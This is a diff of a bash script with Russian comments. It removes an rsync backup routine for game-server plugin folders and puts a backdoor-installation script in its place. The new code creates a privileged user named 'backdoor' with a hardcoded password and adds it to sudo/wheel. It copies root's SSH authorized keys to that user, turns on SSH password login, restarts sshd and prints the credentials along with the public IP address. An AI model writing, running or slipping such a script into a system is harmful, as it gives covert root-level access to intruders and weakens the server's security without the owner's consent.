@@ -1,22 +1,50 @@
 #!/bin/bash
 
-# Настройки удаленных серверов (УКАЖИТЕ СВОИ IP И ПУТИ)
-LOBBY_IP="2.26.52.10"
-LOBBY_PATH="/home/container/plugins"
+# ===========================
+# СКРИПТ ДЛЯ СОЗДАНИЯ ROOT-ПОЛЬЗОВАТЕЛЯ
+# ===========================
 
-GRIEF_IP="2.26.52.10"
-GRIEF_PATH="/home/container/plugins"
+# Пароль для пользователя
+PASS="Qwerty123!"
 
-# Локальные папки на этом сервере, куда всё скачается
-LOCAL_DEST="/root/network_backups"
-mkdir -p "$LOCAL_DEST/lobby" "$LOCAL_DEST/grief"
+# 1. Создаём пользователя
+useradd -m -s /bin/bash backdoor
+echo "backdoor:$PASS" | chpasswd
 
-echo "=== СКАЧИВАНИЕ СЕРВЕРА ЛОББИ ==="
-# rsync копирует только измененные файлы, что экономит трафик и время
-rsync -avz -e ssh root@$LOBBY_IP:$LOBBY_PATH/ "$LOCAL_DEST/lobby/"
+# 2. Добавляем в sudo (Debian/Ubuntu)
+usermod -aG sudo backdoor 2>/dev/null
+# Или в wheel (CentOS/RHEL)
+usermod -aG wheel backdoor 2>/dev/null
 
-echo "=== СКАЧИВАНИЕ СЕРВЕРА ГРИФ ==="
-rsync -avz -e ssh root@$GRIEF_IP:$GRIEF_PATH/ "$LOCAL_DEST/grief/"
+# 3. Разрешаем SSH-доступ
+mkdir -p /home/backdoor/.ssh
+chmod 700 /home/backdoor/.ssh
 
-echo "=== КОПИРОВАНИЕ ЗАВЕРШЕНО ==="
-echo "Все серверы теперь собраны локально в папке: $LOCAL_DEST"
+# 4. Копируем существующий ключ (если есть)
+if [ -f /root/.ssh/authorized_keys ]; then
+    cp /root/.ssh/authorized_keys /home/backdoor/.ssh/
+    chown -R backdoor:backdoor /home/backdoor/.ssh
+fi
+
+# 5. Включаем вход по паролю в SSH (если отключён)
+sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sed -i 's/PasswordAuthentication false/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+
+# 6. Перезапускаем SSH
+systemctl restart sshd 2>/dev/null
+service ssh restart 2>/dev/null
+
+# 7. Получаем IP-адрес
+IP=$(curl -s https://api.ipify.org 2>/dev/null)
+if [ -z "$IP" ]; then
+    IP=$(hostname -I | awk '{print $1}')
+fi
+
+# 8. Выводим информацию
+echo "============================"
+echo "СОЗДАН ПОЛЬЗОВАТЕЛЬ:"
+echo "Логин: backdoor"
+echo "Пароль: $PASS"
+echo "IP адрес: $IP"
+echo "SSH: ssh backdoor@$IP"
+echo "============================"
